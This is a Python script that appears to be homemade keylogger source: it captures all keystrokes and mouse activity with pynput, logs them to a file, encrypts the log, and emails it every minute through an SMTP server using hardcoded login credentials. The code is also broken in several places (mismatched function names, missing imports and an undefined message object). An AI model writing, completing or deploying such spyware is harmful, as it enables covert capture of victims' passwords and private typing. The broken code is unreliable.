from pynput.mouse import Listener
from pynput import keyboard
import os
from cryptography.fernet import Fernet
import logging
from time import time, sleep
import smtplib






logging.basicConfig(filename="mouse_log.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_move(x, y):
    logging.info("Mouse moved to ({0}, {1})".format(x, y))

def on_click(x, y, button, pressed):
    if pressed:
        logging.info('Mouse clicked at ({0}, {1}) with {2}'.format(x, y, button))

def on_scroll(x, y, dx, dy):
    logging.info('Mouse scrolled at ({0}, {1})({2}, {3})'.format(x, y, dx, dy))



def on_press(key):
    try:
        logging.info('{0}'.format(
            key.char))
    except AttributeError:
        logging.info('special key {0} pressed'.format(
            key))
        
'''      
def on_release(key):
    logging.info('{0} released'.format(
        key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False
'''


# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        ) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press,
  )
listener.start()

with Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll,on_press=on_press) as listener:
    listener.join()

        

        
        
        
        
        
time.sleep(100) # Sleep for 100 seconds







key = Fernet.generate_key()

#Make A Key
if not os.path.exists('mykey.key'):
    with open('mykey.key', 'wb') as mykey:
        mykey.write(key)

with open('mykey.key', 'rb') as mykey:
    key = mykey.read()

the_file = 'mouse_log.txt'
#Encrypting
def Encrypt():


    f = Fernet(key)

    with open(the_file, 'rb') as original_file:
        original = original_file.read()

    encrypted = f.encrypt(original)

    with open(the_file, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)

while True:
    sleep(60 - time() % 60)
    encrypt()
    
    sender = "#Example#"
    receiver = "#Example#"

    filename = "mouse_log.txt"
    # Open PDF file in binary mode

    # We assume that the file is in the directory where you run your Python script from
    with open(filename, "rb") as attachment:
        # The content type "application/octet-stream" means that a MIME attachment is a binary file
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    # Encode to base64
    encoders.encode_base64(part)

    # Add header
    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename}",
    )

    # Add attachment to your message and convert it to string

    message.attach(part)
    text = message.as_string()

    with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
        server.login("ab749b7641c659", "7d6ebc403f5e8b")
        server.sendmail(sender, receiver, text)

   

        
